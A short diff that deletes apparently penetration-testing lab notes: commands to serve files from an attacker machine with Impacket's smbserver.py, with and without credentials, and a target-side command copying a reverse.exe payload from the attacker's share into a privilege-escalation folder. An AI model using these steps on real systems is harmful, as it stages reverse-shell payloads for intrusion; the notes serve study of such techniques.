@@ -1,8 +1,0 @@
-ATTACKER (without user:passwd)
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py <sharename> .
-
-ATTACKER (with user:passwd)
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <username> -password password <sharename> .
-
-TARGET
-copy \\<ATTACKER>\kali\reverse.exe C:\PrivEsc\reverse.exe
